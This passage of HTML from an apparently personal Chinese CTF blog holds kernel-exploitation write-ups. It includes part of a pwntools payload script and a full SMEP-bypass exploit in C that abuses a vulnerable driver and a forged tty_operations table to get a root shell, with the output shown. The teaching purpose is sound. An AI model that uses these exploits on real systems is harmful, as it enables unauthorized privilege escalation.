class="comment">#v9=s0=0x110</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x01\x00\x00&#x27;</span><span class="comment">#s1=(ret_addr&amp;0xffff00000000)&gt;&gt;32</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x02\x00\x00&#x27;</span><span class="comment">#s2=(ret_addr&amp;0xffff0000)&gt;&gt;16</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x03\x00\x00&#x27;</span><span class="comment">#s3=(ret_addr&amp;0xfffff)</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x70\xb3&#x27;</span><span class="comment">#s0=0x70b3</span></span><br><span class="line">pay+=<span class="string">&#x27;\x03\x03\x03\x00&#x27;</span><span class="comment">#s3=s3-s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x02&#x27;</span><span class="comment">#s0=0x2</span></span><br><span class="line">pay+=<span class="string">&#x27;\x03\x02\x02\x00&#x27;</span><span class="comment">#s2=s2-s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00&#x27;</span>+p8(<span class="number">0x6c</span>)+p8(<span class="number">0x81</span>)<span class="comment">#s0=0x6c81</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x03\x03\x00&#x27;</span><span class="comment">#s3=s3+s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00&#x27;</span>+p8(<span class="number">0xe</span>)<span class="comment">#s0=0xe</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x02\x02\x00&#x27;</span><span class="comment">#s2=s2+s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x01\x0c&#x27;</span><span class="comment">#s0=0x10c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf6\x00&#x27;</span><span class="comment">#v9&amp;0xffff=07x10c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x80\x00&#x27;</span><span class="comment">#s0=0x8000</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf9\x00&#x27;</span><span class="comment">#v9=0x800000000000010c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x00&#x27;</span><span class="comment">#s0=0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x00\x03\x00&#x27;</span><span class="comment">#s0=s3</span></span><br><span class="line">pay+=<span class="string">&#x27;\x09\x00\x00\x00&#x27;</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x00&#x27;</span><span class="comment">#s0=0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x00\x02\x00&#x27;</span><span class="comment">#s0=s2</span></span><br><span class="line">pay+=<span class="string">&#x27;\x09\x00\x00\x00&#x27;</span></span><br><span class="line">sh.sendline(pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/smep%E7%BB%95%E8%BF%87%E5%8F%8Atty-opertions/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/smep%E7%BB%95%E8%BF%87%E5%8F%8Atty-opertions/" class="post-title-link" itemprop="url">smep绕过及tty_opertions</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-12 01:59:36 / 修改时间：02:01:05" itemprop="dateCreated datePublished" datetime="2022-03-12T01:59:36+08:00">2022-03-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="smep绕过"><a href="#smep绕过" class="headerlink" title="smep绕过"></a>smep绕过</h1><h2 id="0x1-smep机制"><a href="#0x1-smep机制" class="headerlink" title="0x1 smep机制"></a>0x1 smep机制</h2><p>smep是内核态的一种保护机制，当CPU处于内核态的时候，即处于ring0的时候不允许访问用户态的代码，所以上篇的ret2user就直接不能使用了。</p>
<p>但是也有绕过办法，这个实现smep的机制密不可分，系统会通过cr4的第20位是否为1判断是否开启了smep,只要能执行rop然后mov改变cr4的第二十位为0就行，然后就可以执行用户态的代码了。</p>
<h2 id="0x2-tty-struct"><a href="#0x2-tty-struct" class="headerlink" title="0x2 tty_struct"></a>0x2 tty_struct</h2><p>当用户打开ptmx驱动的时候会给其分配一个tty_struct结构，具体定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span>  </span><br><span class="line">    <span class="keyword">int</span> magic;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span>  </span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>  </span><br><span class="line">    <span class="keyword">int</span> index;  </span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span>  </span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;  </span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;  </span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span>  </span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;  </span><br><span class="line">    <span class="keyword">int</span> count;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span>  </span><br><span class="line">              flow_stopped:<span class="number">1</span>,  </span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">int</span> hw_stopped;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span>  </span><br><span class="line">              packet:<span class="number">1</span>,  </span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span>  </span><br><span class="line">    <span class="keyword">int</span> flow_change;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span>  </span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;  </span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span>  </span><br><span class="line">    <span class="keyword">void</span> *disc_data;  </span><br><span class="line">    <span class="keyword">void</span> *driver_data;  </span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096  </span></span><br><span class="line">    <span class="keyword">int</span> closing;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;  </span><br><span class="line">    <span class="keyword">int</span> write_cnt;  </span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span>  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>

<p>然后有一个类似虚表指针<code>const struct tty_operations *ops</code>,这个指针指向一个这样的虚表，里面储存了大量的函数地址，可以把这个设备当成c+++中的一个对象，当对这个对象执行虚函数的时候会从这个虚表中找到对应函数的地址然后在执行，可见执行<code>open() read() write() close() </code>的时候都会从这个虚表中找函数地址，只要我们能伪<code>tty_struct</code>就可以间接控制<code>tty_operations</code>了，通过修改虚表中函数地址来控制程序流了，其中write()处于ty_operations[7],当程序执行虚表函数的时候rax就永远指向虚表第一项，所以可以结合write和rax来完成rop。(感觉很像house of kiwi,都是通过一个固定寄存器和相对调用完成rop)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,  </span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span>  </span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);  </span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);  </span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,  </span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);  </span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);  </span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,  </span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);  </span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,  </span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);  </span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);  </span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);  </span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);  </span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);  </span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);  </span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);  </span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,  </span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);  </span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);  </span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);  </span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,  </span><br><span class="line">                struct serial_icounter_struct *icount);  </span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL  </span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);  </span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);  </span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>

<h2 id="0x3-脚本"><a href="#0x3-脚本" class="headerlink" title="0x3 脚本"></a>0x3 脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_creds=<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">void</span>* fake_tty_operatios[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">            (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_creds))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff810d238d</span>; <span class="comment">//pop rdi ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff81004d80</span>;<span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff81063694</span>;<span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0xFFFFFFFF8181A797</span>;<span class="comment">//iretq</span></span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">        fake_tty_operatios[i]=<span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">////mov rsp, rax;dec ebx;ret</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operatios[<span class="number">0</span>]=<span class="number">0xffffffff810635f5</span>;<span class="comment">//pop rax; pop rbp; ret</span></span><br><span class="line">    fake_tty_operatios[<span class="number">1</span>]=(<span class="keyword">size_t</span>)rop;</span><br><span class="line">    fake_tty_operatios[<span class="number">3</span>]=<span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line">    <span class="keyword">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> fd_tty=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR|O_NOCTTY);</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2,fake_tty_struct,<span class="number">32</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=(<span class="keyword">size_t</span>)fake_tty_operatios;</span><br><span class="line">    write(fd2,fake_tty_struct,<span class="number">32</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty,buf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x4-最终效果"><a href="#0x4-最终效果" class="headerlink" title="0x4 最终效果"></a>0x4 最终效果</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ $ ls</span><br><span class="line">bin      etc      flag     init     proc     sys</span><br><span class="line">da.sh    exp      gadget   lib      root     tmp</span><br><span class="line">dev      exp.c    home     linuxrc  sbin     usr</span><br><span class="line">/ $ cat flag</span><br><span class="line">cat: can&#x27;t open &#x27;flag&#x27;: Permission denied</span><br><span class="line">/ $ ./exp</span><br><span class="line">[   16.387072] device open</span><br><span class="line">[   16.388872] device open</span><br><span class="line">[   16.390499] alloc done</span><br><span class="line">[   16.392086] device release</span><br><span class="line">/ # cat flag</span><br><span class="line">falg&#123;123&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x5-思考"><a href="#0x5-思考" class="headerlink" title="0x5 思考"></a>0x5 思考</h2><p>rop布置在内核态和用户态有很大的区别，当布置在内核态的时候，如果组成rop的gadget全是内核gadget的时候，就不会触发semep和smap，但是如果布置在用户态的时候，就算全部是内核态的gadget,也会触发smap,因为每次ret的时候都会访问用户态数据拿到地址，就触发smap了，至于为什么不触发smep,因为全程都没有执行用户态代码。</p>
<h2 id="0x6-总结"><a href="#0x6-总结" class="headerlink" title="0x6 总结"></a>0x6 总结</h2><p><strong>iretq</strong>:指令则用来恢复用户态的 cs、ss、rsp、rip、rflags，恢复的时候的布局如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">|    RIP    |</span><br><span class="line">+-----------+</span><br><span class="line">|    CS     |</span><br><span class="line">+-----------+</span><br><span class="line">|   rflags  |</span><br><span class="line">+-----------+</span><br><span class="line">|    RSP    |</span><br><span class="line">+-----------+</span><br><span class="line">|    SS     |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>

<p>可见这条指令会直接改变rip的值，当这条指令执行完之后会去执行rip处的指令，假如rip处是get_shell的函数地址，这条指令完就直接执行get_shell函数了，所以不用<code>iretq;ret</code>，直接<code>iretq</code>就可以返回用户态并执行get_shell了。</p>
<p><strong>gadget</strong>:使用ropper寻找gadget是最合适的。</p>
<p><strong>函数偏移量</strong>:比如这道题解出来的vmlinux好像没有符号表，所以无法通过pwn直接得到偏移量，这时可以让内核运行起来，然后通过这行shell得到某个内核函数的地址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms|grep &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/ret2user/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/ret2user/" class="post-title-link" itemprop="url">ret2user</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-12 01:59:09 / 修改时间：02:01:40" itemprop="dateCreated datePublished" datetime="2022-03-12T01:59:09+08:00">2022-03-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h1><p>古老的手法，一般是在没开semp的情况下，用户空间不能访问内核态，内核态可以直接执行内核态的代码，所以可以在用户态写上提权代码，然后内核态访问这段代码，最后返回用户态执行执行system(“/bin/sh”);</p>
<p>注意不要直接在内核态执行system(“/bin/sh”)</p>
